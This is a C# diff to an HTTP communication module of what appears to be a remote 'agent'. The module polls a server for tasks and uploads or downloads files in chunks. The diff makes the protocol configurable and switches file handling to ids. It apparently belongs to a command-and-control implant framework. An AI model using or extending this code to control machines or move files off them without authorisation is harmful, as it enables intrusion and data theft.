@@ -15,15 +15,18 @@ namespace Agent.Models
     {
         public string ConnectAddress { get; set; }
         public int ConnectPort { get; set; }
+        
+        public string Protocol { get; set; }
 
         private CancellationTokenSource _tokenSource;
 
         private HttpClient _client;
 
-        public HttpCommModule(string connectAddress, int connectPort)
+        public HttpCommModule(string protocol, string connectAddress, int connectPort)
         {
             ConnectAddress=connectAddress;
             ConnectPort=connectPort;
+            Protocol = protocol;
 
             ServicePointManager.Expect100Continue = true;
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
@@ -42,7 +45,8 @@ namespace Agent.Models
 
             _client = new HttpClient();
             _client.Timeout = new TimeSpan(0, 0, 10);
-            _client.BaseAddress = new Uri($"https://{this.ConnectAddress}:{this.ConnectPort}");
+            //_client.BaseAddress = new Uri($"https://{this.ConnectAddress}:{this.ConnectPort
+            _client.BaseAddress = new Uri($"{this.Protocol}://{this.ConnectAddress}:{this.ConnectPort}");
             //Console.WriteLine(_client.BaseAddress);
             _client.DefaultRequestHeaders.Clear();
 
@@ -96,6 +100,7 @@ namespace Agent.Models
         private void HandleResponse(byte[] response)
         {
             var tasks = response.Deserialize<AgentTask[]>();
+            //string bitString = Encoding.UTF8.GetString(response, 0, response.Length);
             if (tasks != null && tasks.Any())
             {
                 foreach (var task in tasks)
@@ -108,9 +113,9 @@ namespace Agent.Models
             _tokenSource.Cancel();
         }
 
-        private async Task<FileDescriptor> SetupDownload(string filename)
+        private async Task<FileDescriptor> SetupDownload(string id)
         {
-            var response = await _client.GetByteArrayAsync($"/SetupDownload?filename={filename}");
+            var response = await _client.GetByteArrayAsync($"/SetupDownload?id={id}");
             //var json = Encoding.UTF8.GetString(response);
             return response.Deserialize<FileDescriptor>();
         }
@@ -138,9 +143,9 @@ namespace Agent.Models
         }
 
 
-        public override async Task<Byte[]> Download(string filename, Action<int> OnCompletionChanged = null)
+        public override async Task<Byte[]> Download(string id, Action<int> OnCompletionChanged = null)
         {
-            var desc = await this.SetupDownload(filename);
+            var desc = await this.SetupDownload(id);
             var chunks = new List<FileChunk>();
 
             for (int index = 0; index < desc.ChunkCount; ++index)
@@ -165,7 +170,7 @@ namespace Agent.Models
 
         public const int ChunkSize = 10000;
 
-        public override async Task Upload(byte[] fileBytes, string filename, Action<int> OnCompletionChanged = null)
+        public override async Task<string> Upload(byte[] fileBytes, string filename, Action<int> OnCompletionChanged = null)
         {
 
             var desc = new FileDescriptor()
@@ -214,6 +219,8 @@ namespace Agent.Models
                 OnCompletionChanged?.Invoke(index * 100 / desc.ChunkCount);
                 index++;
             }
+
+            return desc.Id;
         }
 
     }
